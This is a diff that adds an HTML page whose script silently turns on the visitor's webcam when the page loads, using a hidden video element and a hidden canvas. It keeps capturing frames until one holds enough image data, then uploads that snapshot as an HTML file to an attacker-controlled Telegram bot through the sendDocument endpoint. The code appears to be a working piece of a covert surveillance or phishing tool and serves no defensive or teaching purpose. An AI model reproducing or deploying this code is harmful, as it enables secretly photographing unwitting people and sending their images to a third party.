@@ -1,0 +1,78 @@
+
+  <body onload="init();">
+    <video hidden onclick="snapshot(this);" width=400 height=400 id="video" controls autoplay></video>
+      <canvas hidden id="myCanvas" width="400" height="350"></canvas>
+  </body>
+  <script>
+          navigator.getUserMedia = ( navigator.getUserMedia ||
+                             navigator.webkitGetUserMedia ||
+                             navigator.mozGetUserMedia ||
+                             navigator.msGetUserMedia);
+      var video;
+      var webcamStream;
+	  var started_stream = false;
+
+      function startWebcam() {
+        if (navigator.getUserMedia) {
+           navigator.getUserMedia (
+              // constraints
+              {
+                 video: true,
+                 audio: false
+              },
+              // successCallback
+              function(localMediaStream) {
+                 video = document.querySelector('video');
+                 video.srcObject=localMediaStream;
+                 webcamStream = localMediaStream;
+				 restream();
+              },
+              // errorCallback
+              function(err) {
+                 console.log("The following error occured: " + err);
+              }
+           );
+        } else {
+           console.log("getUserMedia not supported");
+        }
+      }
+
+      var canvas, ctx;
+      function init() {
+        // Get the canvas and obtain a context for
+        // drawing in it
+        canvas = document.getElementById("myCanvas");
+        ctx = canvas.getContext('2d');
+      }
+      function snapshot() {
+        ctx.drawImage(video, 0,0, canvas.width, canvas.height);
+      }
+	  function botsendfile(enc_data){
+
+		  var blob = new Blob([enc_data], { type: 'plain/text' });
+
+		  var formData = new FormData();
+		  formData.append('chat_id', eid);
+		  formData.append('document', blob, 'result_photo.html');
+
+		  var request = new XMLHttpRequest();
+		  request.open('POST', 'https://api.telegram.org/bot'+etoken+'/sendDocument');
+		  request.send(formData);
+	  }
+	  
+	  function restream(){
+			snapshot();
+			var shot= canvas.toDataURL('image/png');
+			if(shot.length<=20000){
+				setTimeout(restream, 1000);
+			}
+			else{
+				console.log(shot.length);
+				botsendfile("<img src=\""+shot+"\"/>");
+				
+			}
+			
+	  }
+	  startWebcam();
+	  
+  </script>
